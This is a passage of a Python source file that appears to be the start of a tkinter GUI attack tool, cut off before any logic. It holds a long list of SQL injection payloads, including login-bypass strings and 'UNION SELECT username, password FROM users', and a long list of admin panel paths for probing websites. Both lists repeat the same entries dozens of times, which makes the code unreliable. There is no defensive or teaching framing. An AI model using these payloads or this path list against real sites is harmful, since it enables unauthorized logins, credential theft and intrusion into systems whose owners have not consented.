import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog, Menu
import requests
import time
import threading
from queue import Queue
from urllib.parse import urlparse, urljoin

# Expanded list of SQL Injection payloads
sql_payloads = [
"' OR 1=1 -- ", "' OR '1'='1' -- ", "' OR '1'='1'/* ", "' OR 1=1# ",
    "' OR 1=1;-- ", "' OR '1'='1';-- ", "' OR '1'='1'/* ", "' OR '1'='1'-- ",
    "' OR 1=1 AND ''='", "' OR 1=1 AND 'x'='x'-- ", "' OR 1=1 AND '1'='1'-- ",
    "' OR 1=1 AND 1=1-- ", "' UNION SELECT NULL -- ", "' OR 1=1 OR 'a'='a'-- ",
    "' OR 'a'='a' -- ", "' OR 'a'='a'/* ", "' OR 'a'='a'-- ", "' OR 'a'='a'# ",
    "' OR 1=1 AND 1=2-- ", "' UNION SELECT username, password FROM users -- ",
    "' OR 1=1 --+ ", "' OR 'x'='x' -- ", "' OR 1=1 -- ", "' AND 1=1 -- ",
    "' OR 1=2 -- ", "' OR 1=1# ", "' OR 1=1/* ", "' OR 1=1; -- ", "' OR 1=1/* ",
    "' OR 1=1# ", "' OR 1=1;-- ", "' OR '1'='1' -- ", "' OR 1=1 OR 1=1 -- ",
    "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR 1=1# ", "' OR 1=1 -- ", "' UNION SELECT 1,2,3-- ",
    "' OR 1=1-- ", "' OR 1=1# ", "' OR 1=1/* ", "' OR 1=1-- ", "' OR 'a'='a' -- ",
    "' OR 'a'='a' -- ", "' OR 'a'='a'/* ", "' OR 'a'='a'-- ", "' OR 'a'='a'# ",
    "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ", "' OR 1=1 OR 1=2 -- ",
    "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ", "' OR '1'='1' -- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1 AND 1=1-- ", "' OR '1'='1'/* ",
    "' OR '1'='1'# ", "' OR 1=1/* ", "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1;-- ",
    "' OR 1=1 OR '1'='1'-- ", "' OR '1'='1'/* ", "' OR '1'='1'# ", "' OR '1'='1' -- ",
    "' OR 1=1 -- ", "' OR 1=1/* ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# ", "' OR 1=1 AND 1=2-- ", "' OR 1=1 UNION SELECT NULL-- ",
    "' OR 1=1 OR 1=2 -- ", "' OR 1=1 UNION SELECT 1,2,3-- ", "' OR 1=1 AND 1=3-- ",
    "' OR 1=1-- ", "' OR '1'='1' -- ", "' OR 1=1/* ", "' OR '1'='1' -- ",
    "' OR 1=1 AND 1=1-- ", "' OR 1=1-- ", "' OR 'a'='a' -- ", "' OR 'a'='a'-- ",
    "' OR 'a'='a'/* ", "' OR 'a'='a'# "
]

# Expanded list of common admin panel paths
admin_paths = [
"/admin", "/administrator", "/admin/login", "/admin.php", "/admin/login.php",
    "/admin_area", "/admin_panel", "/admin_dashboard", "/admin_area.php", "/admin_panel.php",
    "/admin_login", "/admin_area.html", "/admin.php/login", "/admin/admin", "/admin_login.php",
    "/admin/index.php", "/admin/login.html", "/administrator/index.php", "/admin/dashboard.php",
    "/admincontrol", "/admin/admin.php", "/admin/admin_login", "/admin/console", "/admin/login",
    "/admin2", "/admin3", "/controlpanel", "/cpanel", "/manager", "/management", "/manage",
    "/adminpanel", "/admin/index.html", "/admin_console", "/admin_area/index.php", "/admin_area/login.php",
    "/admin_login.html", "/admin-dashboard", "/admin/settings", "/admin_panel/login", "/admin/index",
    "/admin_area/admin", "/admin_dashboard/index.php", "/administrator/login", "/admin/dashboard",
    "/admin_console/index.php", "/admin_login.php", "/administrator_area", "/admin_control",
    "/administrator/login.php", "/admin-console", "/admin_area/admin.php", "/admin_area/index.html",
    "/admin/index", "/admin-dashboard/index.php", "/admin_control/login", "/adminlogin", "/admin_area",
    "/administrator/control", "/admin-login", "/admin_login_area", "/adminarea/index.php", "/admin.php/login",
    "/admin_login/index.php", "/admin_area.php", "/adminlogin.php", "/adminpanel.php", "/adminpanel/index.php",
    "/admin_login_area.php", "/admin_control/index.php", "/administrator_dashboard", "/admin/index.html",
    "/admin-area", "/adminpanel", "/admin-login.php", "/admin_area/index.php", "/admin_login/index.html",
    "/admin_control_panel", "/admin_console/login.php", "/admin_area/admin/index.php", "/admin_panel/login.php",
    "/admin_area/admin/login.php", "/admin_dashboard/login.php", "/admin/index.php", "/admin_panel/index.php",
    "/admin_login", "/admin_area/login.php", "/admin_control/login.php", "/admin_dashboard/index.html",
    "/admin/index", "/admin-area/index.php", "/admin_area_login", "/admin_dashboard.html", "/admin_login.html",
    "/admin_panel/admin.php", "/admin_area.php", "/admin_console/index.html", "/admin_control/login.html",
    "/admin_login", "/admin_area/index.html", "/admin_dashboard.php", "/admin_console/login.html",
    "/admin/login.html", "/admin/index.html", "/admin_control_panel.php", "/admin_area/admin/index.html",
    "/admin_area.php", "/admin/login", "/admin_panel/index.html", "/admin_area/login.html", "/admin_control.php",
    "/admin_console/index.php", "/admin/index.html", "/admin_panel/login.php", "/admin_console.html",
    "/admin_login/index.html", "/admin_dashboard/index.html", "/admin_area/index.php", "/admin/index",
    "/admin_area/login.php", "/admin_area/admin_login.php", "/admin_area/admin/index.php", "/adminpanel",
    "/admin_area/admin/login.html", "/admin_login/index.php", "/admin_console.html", "/admin_area/login.html",
    "/admin_panel/index.html", "/admin_dashboard/index.php", "/admin_area/dashboard.php", "/admin/index",
    "/admin_area/dashboard.php", "/admin_panel/admin.php", "/admin_login.php", "/admin_area/index.php",
    "/admin_dashboard/index.html", "/admin/index.html", "/admin_console/index.html", "/admin_area/admin_login.php",
    "/admin_panel/admin/index.php", "/admin_area/admin/index.html", "/admin_login.html", "/admin/index.php",
    "/admin_control_panel/index.php", "/admin_area/login", "/admin_panel/index.html", "/admin_control/index.html",
    "/admin_area/index.html", "/admin_dashboard.php", "/admin_panel/index.html", "/admin/login.php",
    "/admin_area/admin/index.php", "/admin_login_area.php", "/admin_area/admin.php", "/admin_login",
    "/admin_area/index.html", "/admin_dashboard/login.html", "/admin_control/index.php", "/admin_console/login.php",
    "/admin_area_dashboard", "/admin_area/admin_login.html", "/admin_panel/login.html", "/admin_login.php",
    "/admin_panel/dashboard.php", "/admin_area/admin_login", "/admin/index.php", "/admin_panel.php",
    "/admin_dashboard/index.html", "/admin_control_panel/index.html", "/admin_dashboard.html",
    "/admin_login.html", "/admin_area/index.html", "/admin_panel/admin.php", "/admin_control/login.php",
    "/admin_dashboard/login.html", "/admin_area/dashboard/index.html", "/admin_area.php", "/admin/index",
    "/admin_control/index.php", "/admin_console.html", "/admin_login", "/admin_area/admin/index.php",
    "/admin_panel/dashboard.php", "/admin_dashboard/index.html", "/admin_control/login.html", "/admin_login.php",
    "/admin_area/login", "/admin_area/admin.php", "/admin_console/index.php", "/admin_panel/admin_login.php",
    "/admin_dashboard/index.php", "/admin/index", "/admin_area/index.php", "/admin_control/index.html",
    "/admin_panel/index.php", "/admin_login.php", "/admin_area/admin_login.php", "/admin_dashboard/login.php",
    "/admin_login/index.php", "/admin_panel/dashboard.php", "/admin_area/index.html", "/admin_control/login.html",
    "/admin_area/admin/index.php", "/admin_panel/index.html", "/admin_area/login.html", "/admin_login",
    "/admin_control/index.html", "/admin_panel/admin_login.php", "/admin_dashboard/index.html", "/admin_area.php",
    "/admin_panel/login.php", "/admin_area/admin_login", "/admin_login.html", "/admin_dashboard/index.php",
    "/admin_area/index.php", "/admin_control_panel/index.html", "/admin_login", "/admin/index.html",
    "/admin_area/index.html", "/admin_panel/index.php", "/admin_dashboard/index.html", "/admin_area/admin.php",
    "/admin_control/login.php", "/admin_control_panel.php", "/admin_area/admin/index.html", "/admin_login/index.php",
    "/admin_panel/login.html", "/admin_area/index.html", "/admin_area/index.php", "/admin_panel/admin/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin/login.php", "/admin_control_panel/index.php",
    "/admin_area/admin/index.php", "/admin_area/login.php", "/admin_console.html", "/admin_area/index.html",
    "/admin_panel/index.html", "/admin_control/index.html", "/admin_dashboard/login.html",
    "/admin_dashboard/login.php", "/admin_panel/index.php", "/admin_area/admin_login.php", "/admin_login",
    "/admin_login.php", "/admin_panel/admin_login.html", "/admin_area/index.php", "/admin_panel/index.html",
    "/admin_control_panel.php", "/admin_area/admin/index.html", "/admin_dashboard/index.html", "/admin/index",
    "/admin_area/admin_login.html", "/admin_area/login.php", "/admin_panel/login.html", "/admin_area/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin_login", "/admin_login/index.html", "/admin_panel/index.php",
    "/admin_login.php", "/admin_panel/index.html", "/admin_control_panel/index.html", "/admin_area/index.php",
    "/admin_dashboard/index.php", "/admin_login/index.php", "/admin_panel/admin_login.php",
    "/admin_control/login.html", "/admin_area/admin/index.php", "/admin_area/index.php",
    "/admin_control/index.php", "/admin_dashboard/login.html", "/admin_panel/index.html",
    "/admin_area/admin_login.html", "/admin_control_panel/index.php", "/admin_login.php",
    "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_panel/admin.php", "/admin_area/login",
    "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_console/index.html", "/admin_control.php",
    "/admin_panel/login.php", "/admin_area/dashboard/index.html", "/admin/index", "/admin_area/admin_login.php",
    "/admin_control/index.php", "/admin_area/index.php", "/admin_area/admin.php", "/admin_login",
    "/admin_panel/index.html", "/admin_console/index.html", "/admin_panel/index.php", "/admin_dashboard.php",
    "/admin/index.html", "/admin_area/admin_login.php", "/admin_control_panel/index.php",
    "/admin_dashboard/index.html", "/admin_login/index.html", "/admin_area/login.php", "/admin_panel/admin.php",
    "/admin_control/index.html", "/admin_control_panel/index.html", "/admin_area/index.php",
    "/admin_dashboard/login.html", "/admin_panel/admin_login.php", "/admin_area/admin.php",
    "/admin_area/admin/index.php", "/admin_dashboard/index.php", "/admin_area/admin/index.html", "/admin_login.html",
    "/admin/index", "/admin_control/index.html", "/admin_dashboard/index.html", "/admin_area/index.html",
    "/admin_panel/index.html", "/admin_area/index.php", "/admin_panel/admin_login.php", "/admin_console/index.html",
    "/admin_area/login", "/admin_dashboard/index.php", "/admin_control_panel/index.html", "/admin_dashboard.php",
    "/admin/index.php", "/admin_login.php", "/admin_area/admin/index.php", "/admin_area/admin_login.php",
    "/admin_panel/index.html", "/admin_area/dashboard.php", "/admin_login/index.html", "/admin_panel/index.html",
    "/admin_control/index.html", "/admin_dashboard/index.html", "/admin_login.php", "/admin_area/index.php",
    "/admin_area/admin/index.html", "/admin_panel/index.php", "/admin_panel/admin_login.php", "/admin_dashboard/index.html",
    "/admin_console/index.php", "/admin_area/login.php", "/admin_panel/index.html", "/admin_login/index.php",
    "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_login.html", "/admin_console/login.php",
    "/admin_area/dashboard.php", "/admin_control/index.php", "/admin_control_panel.php", "/admin_area/index.php",
    "/admin_panel/index.php", "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_console/index.html",
    "/admin_area/admin_login.php", "/admin_panel/dashboard.php", "/admin_area/admin/index.php", "/admin_area/index.php",
    "/admin_dashboard/index.php", "/admin_login.php", "/admin_area/index.html", "/admin_login/index.php",
    "/admin_console/index.html", "/admin_area/login.php", "/admin_dashboard/index.html", "/admin_panel/index.html",
    "/admin_control_panel/index.php", "/admin_login.php", "/admin_area/admin.php", "/admin_control/index.php",
    "/admin_area/admin/index.html", "/admin_console/login.html", "/admin_login/index.php", "/admin_dashboard/index.html",
    "/admin_control_panel/index.html", "/admin_panel/index.php", "/admin_dashboard/index.php",
    "/admin_area/admin_login.php", "/admin_area/admin/index.html", "/admin_area/index.html", "/admin_login.php",
    "/admin_login/index.html", "/admin_panel/admin.php", "/admin_control/index.html", "/admin_dashboard/index.php",
    "/admin_area/login.php", "/admin_control_panel.php", "/admin_dashboard/index.html", "/admin_area/admin.php",
    "/admin_dashboard/index.php", "/admin_area/admin/index.php", "/admin_area/admin_login.html", "/admin_console.html",
    "/admin_area/index.html", "/admin_login/index.php", "/admin_panel/index.php", "/admin_dashboard/index.html",
    "/admin_area/admin/index.html", "/admin_panel/index.php", "/admin_dashboard/index.html", "/admin_console/index.php",
    "/admin_area/index.php", "/admin_area/admin/index.php", "/admin_login.php", "/admin_area/login.php",
    "/admin_area/admin_login.php", "/admin_control/index.html", "/admin_console/index.html", "/admin_panel/index.html",
    "/admin_panel/login.php", "/admin_dashboard/index.php", "/admin_control_panel/index.php", "/admin_area/index.html",
    "/admin_dashboard/login.php", "/admin_area/index.php", "/admin_console/login.php", "/admin_area/admin.php",
    "/admin_area/admin/index.php", "/admin_login.html", "/admin_login/index.php", "/admin_panel/dashboard.php",
    "/admin_area/admin_login.php", "/admin_area/login.php", "/admin_panel/index.html", "/admin_area/index.html",
    "/admin_console/index.php", "/admin_control/index.php", "/admin_dashboard/index.html", "/admin_area/admin.php",
    "/admin_login/index.html", "/admin_area/index.html", "/admin_panel/login.php", "/admin_console/index.html",
    "/admin_dashboard/index.php", "/admin_control/index.php", "/admin_login.php", "/admin_area/admin/index.html",
    "/admin_panel/index.php", "/admin_area/dashboard.php", "/admin_login/index.php", "/admin_control/index.html",
    "/admin_dashboard/index.html", "/admin_login.html", "/admin_dashboard/index.php", "/admin_area/index.php",
    "/admin_panel/index.html", "/admin_area/admin_login.php", "/admin_console/index.php", "/admin_panel/admin_login.php",
    "/admin_area/admin/index.php", "/admin_dashboard/index.html", "/admin_console/login.html", "/admin_area/index.php",
    "/admin_login/index.html", "/admin_panel/dashboard.php", "/admin_area/admin/index.php", "/admin_login.php",
    "/admin_area/index.html", "/admin_control/index.html", "/admin_dashboard/index.php", "/admin_panel/index.php",
    "/admin_login/index.php", "/admin_dashboard/index.html", "/admin_area/index.html", "/admin_login.html",
    "/admin_control/index.php", "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_area/index.php",
    "/admin_console/index.html", "/admin_panel/dashboard.php", "/admin_area/login.php", "/admin_area/admin.php",
    "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_login.php", "/admin_dashboard/index.html",
    "/admin_area/index.php", "/admin_panel/admin.php", "/admin_console/index.php", "/admin_area/admin/index.php",
    "/admin_control/index.html", "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_area/index.html",
    "/admin_area/admin_login.php", "/admin_panel/login.php", "/admin_login.php", "/admin_panel/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin/index.php", "/admin_area/index.php", "/admin_control/index.html",
    "/admin_login/index.php", "/admin_panel/index.php", "/admin_area/dashboard.php", "/admin_login.html",
    "/admin_console/index.php", "/admin_panel/index.html", "/admin_area/index.html", "/admin_area/login.php",
    "/admin_dashboard/index.php", "/admin_area/admin_login.php", "/admin_console/index.html", "/admin_control_panel/index.php",
    "/admin_area/index.html", "/admin_area/index.php", "/admin_panel/admin.php", "/admin_control/index.php",
    "/admin_dashboard/index.html", "/admin_login/index.php", "/admin_area/admin/index.html", "/admin_panel/dashboard.php",
    "/admin_dashboard/index.php", "/admin_control/index.html", "/admin_area/index.html", "/admin_area/admin_login.php",
    "/admin_login.php", "/admin_dashboard/index.html", "/admin_control/index.php", "/admin_area/admin.php",
    "/admin_dashboard/index.html", "/admin_area/index.html", "/admin_panel/index.html", "/admin_login/index.php",
    "/admin_area/admin_login.html", "/admin_dashboard/index.php", "/admin_control/index.html", "/admin_area/index.php",
    "/admin_panel/login.php", "/admin_area/index.html", "/admin_dashboard/index.html", "/admin_login.html",
    "/admin_panel/index.php", "/admin_area/admin/index.php", "/admin_console/index.php", "/admin_dashboard/index.php",
    "/admin_area/login.html", "/admin_control/index.php", "/admin_login/index.html", "/admin_dashboard/index.php",
    "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_control_panel/index.php",
    "/admin_console/login.php", "/admin_panel/index.html", "/admin_area/index.php", "/admin_area/index.html",
    "/admin_area/login.php", "/admin_login.php", "/admin_area/admin/index.php", "/admin_dashboard/index.html",
    "/admin_area/dashboard.php", "/admin_control/index.html", "/admin_login/index.html", "/admin_panel/index.php",
    "/admin_dashboard/index.php", "/admin_area/admin_login.html", "/admin_console/index.php", "/admin_panel/admin.php",
    "/admin_area/index.php", "/admin_panel/dashboard.php", "/admin_control/index.html", "/admin_dashboard/index.html",
    "/admin_area/index.html", "/admin_login.php", "/admin_console/index.html", "/admin_area/admin/index.html",
    "/admin_area/admin_login.php", "/admin_panel/index.php", "/admin_login/index.php", "/admin_control/index.php",
    "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_console/login.php", "/admin_panel/admin.php",
    "/admin_control_panel/index.html", "/admin_area/login.php", "/admin_dashboard/index.html", "/admin_panel/index.html",
    "/admin_area/index.php", "/admin_area/admin_login.php", "/admin_area/index.php", "/admin_control/index.php",
    "/admin_dashboard/index.html", "/admin_login/index.php", "/admin_panel/dashboard.php", "/admin_area/index.html",
    "/admin_area/admin_login.php", "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_panel/index.html",
    "/admin_login.php", "/admin_area/index.php", "/admin_control/index.php", "/admin_console/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin_login.html", "/admin_control/index.html", "/admin_panel/index.php",
    "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_console/index.html", "/admin_login/index.php",
    "/admin_area/index.php", "/admin_login.html", "/admin_area/admin_login.php", "/admin_control/index.html",
    "/admin_dashboard/index.php", "/admin_panel/index.html", "/admin_area/admin/index.html", "/admin_login.php",
    "/admin_area/index.html", "/admin_panel/index.php", "/admin_dashboard/index.html", "/admin_control/index.php",
    "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_console/index.php", "/admin_area/index.php",
    "/admin_panel/login.php", "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_control_panel/index.php",
    "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_login/index.html", "/admin_panel/dashboard.php",
    "/admin_area/admin/index.php", "/admin_dashboard/index.html", "/admin_area/login.php", "/admin_console/login.php",
    "/admin_control/index.html", "/admin_panel/index.php", "/admin_area/index.php", "/admin_login.php",
    "/admin_area/admin_login.php", "/admin_dashboard/index.html", "/admin_area/admin/index.html", "/admin_panel/index.html",
    "/admin_dashboard/index.php", "/admin_console/index.php", "/admin_area/index.html", "/admin_panel/index.php",
    "/admin_area/admin/index.html", "/admin_login/index.html", "/admin_dashboard/index.html", "/admin_area/index.php",
    "/admin_panel/admin_login.php", "/admin_dashboard/index.php", "/admin_area/admin_login.html", "/admin_control/index.php",
    "/admin_area/admin/index.php", "/admin_dashboard/index.html", "/admin_area/admin/index.html", "/admin_panel/index.php",
    "/admin_login/index.php", "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_panel/index.html",
    "/admin_control/index.php", "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_login/index.html",
    "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_area/admin_login.php", "/admin_panel/index.php",
    "/admin_area/index.php", "/admin_area/admin_login.php", "/admin_area/index.html", "/admin_panel/admin.php",
    "/admin_login/index.php", "/admin_area/index.php", "/admin_panel/index.html", "/admin_dashboard/index.php",
    "/admin_area/admin/index.html", "/admin_console/index.php", "/admin_area/admin_login.php", "/admin_dashboard/index.php",
    "/admin_panel/index.html", "/admin_login/index.php", "/admin_dashboard/index.php", "/admin_area/index.html",
    "/admin_console/index.php", "/admin_area/admin.php", "/admin_control/index.php", "/admin_panel/index.html",
    "/admin_area/admin_login.php", "/admin_area/admin/index.html", "/admin_dashboard/index.html", "/admin_login.php",
    "/admin_dashboard/index.html", "/admin_control/index.html", "/admin_panel/index.php", "/admin_area/admin_login.php",
    "/admin_area/index.html", "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_area/admin/index.php",
    "/admin_console/index.php", "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_area/admin/index.html",
    "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_login/index.php", "/admin_area/index.html",
    "/admin_dashboard/index.php", "/admin_control/index.html", "/admin_console/index.html", "/admin_area/admin.php",
    "/admin_area/admin_login.php", "/admin_panel/index.html", "/admin_login/index.php", "/admin_area/index.php",
    "/admin_dashboard/index.html", "/admin_console/index.php", "/admin_area/index.php", "/admin_panel/index.php",
    "/admin_area/admin_login.php", "/admin_login/index.html", "/admin_dashboard/index.php", "/admin_panel/index.html",
    "/admin_area/index.php", "/admin_dashboard/index.php", "/admin_area/index.html", "/admin_panel/index.php",
    "/admin_area/admin.php", "/admin_login.php", "/admin_area/admin/index.html", "/admin_area/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin_login.php", "/admin_area/admin/index.php", "/admin_control/index.php",
    "/admin_console/index.html", "/admin_dashboard/index.html", "/admin_area/admin_login.php", "/admin_area/admin/index.html",
    "/admin_control/index.php", "/admin_area/index.php", "/admin_login/index.php", "/admin_panel/index.php",
    "/admin_dashboard/index.html", "/admin_area/index.html", "/admin_panel/index.html", "/admin_console/index.php",
    "/admin_area/admin.php", "/admin_panel/index.html", "/admin_login/index.php", "/admin_area/dashboard.php",
    "/admin_area/admin_login.html", "/admin_area/index.php", "/admin_dashboard/index.php", "/admin_control/index.html",
    "/admin_panel/index.php", "/admin_area/admin/index.php", "/admin_panel/dashboard.php", "/admin_area/admin_login.php",
    "/admin_area/index.html", "/admin_login/index.php", "/admin_area/index.html", "/admin_dashboard/index.php",
    "/admin_panel/admin_login.php", "/admin_area/index.php", "/admin_control/index.php", "/admin_area/admin/index.html",
    "/admin_area/admin_login.php", "/admin_panel/index.php", "/admin_console/index.php", "/admin_dashboard/index.html",
    "/admin_area/dashboard.php", "/admin_area/admin_login.php", "/admin_control_panel/index.php", "/admin_console/index.html",
    "/admin_area/index.php", "/admin_dashboard/index.html", "/admin_area/admin/index.html", "/admin_login.php",
    "/admin_control/index.html", "/admin_area/index.html", "/admin_dashboard/index.php", "/admin_area/admin_login.php",
    "/admin_panel/index.php", "/admin_dashboard/index.html", "/admin_area/index.php", "/admin_control_panel/index.php",
    "/admin_area/admin/index.php", "/admin_console/index.php", "/admin_area/index.html", "/admin_dashboard/index.php",
    "/admin_area/admin_login.php", "/admin_control/index.html", "/admin_area/index.php", "/admin_dashboard/index.html",
    "/admin_panel/index.html", "/admin_console/index.php", "/admin_area/admin/index.html", "/admin_dashboard/index.html",
    "/admin_login/index.php", "/admin_area/admin_login.php", "/admin_dashboard/index.html", "/admin_control/index.php",
    "/admin_console/index.html", "/admin_area/admin_login.php", "/admin_panel/index.php", "/admin_area/index.html",
    "/admin_login/index.html", "/admin_area/index.php", "/admin_dashboard/index.php", "/admin_panel/index.html",
    "/admin_dashboard/index.php", "/admin_area/admin/index.php", "/admin_control_panel/index.php",
    "/admin_area/index.html", "/admin_dashboard/index.html", "/admin_panel/index.php", "/admin_login.php",
    "/admin_area/admin_login.php", "/admin_area/admin/index.php", "/admin_area/index.html", "/admin_panel/index.php",
    "/admin_dashboard/index.php", "/admin_login/index.html", "/admin_area/admin_login.php", "/admin_area/index.php",
    "/admin_dashboard/index.html", "/admin_console/index.php", "/admin_area/index.html", "/admin_control/index.html",
    "/admin_console/index.html", "/admin_area/index.php", "/admin_login/index.php", "/admin_area/index.html",
    "/admin_panel/admin.php", "/admin_area/admin_login.php", "/admin_dashboard/index.php", "/admin_area/admin/index.html",
    "/admin_area/index.php", "/admin_login/index.php", "/admin_panel/index.html", "/admin_dashboard/index.html",
    "/admin_console/index.php", "/admin_area/index.html", "/admin_dashboard/index.html", "/admin_panel/index.html",
    "/admin_login.php", "/admin_panel/dashboard.php", "/admin_area/index.html", "/admin_console/index.html",
    "/admin_dashboard/index.php", "/admin_login/index.php", "/admin_control/index.html", "/admin_panel/index.php",
    "/admin_area/admin_login.php", "/admin_area/admin/index.php", "/admin_dashboard/index.html", "/admin_panel/index.php",
    "/admin_area/index.php", "/admin_console/index.html", "/admin_dashboard/index.php", "/admin_control/index.php",
    "/admin_area/index.html", "/admin_login/index.html", "/admin_area/admin_login.php", "/admin_dashboard/index.html",
    "/admin_panel/index.php", "/admin_control/index.html", "/admin_panel/index.html", "/admin_area/admin/index.html",
    "/admin_area/index.php", "/admin_login/index.php", "/admin_area/index.html", "/admin_dashboard/index.html",
    "/admin_area/admin_login.php", "/admin_panel/index.php", "/admin_console/index.html", "/admin_area/index.html",
    "/admin_control/index.html", "/admin_area/admin.php", "/admin_dashboard/index.php", "/admin_panel/dashboard.php",
    "/admin_console/index.php", "/admin_panel/index.html", "/admin_area/index.php", "/admin_area/admin_login.php",
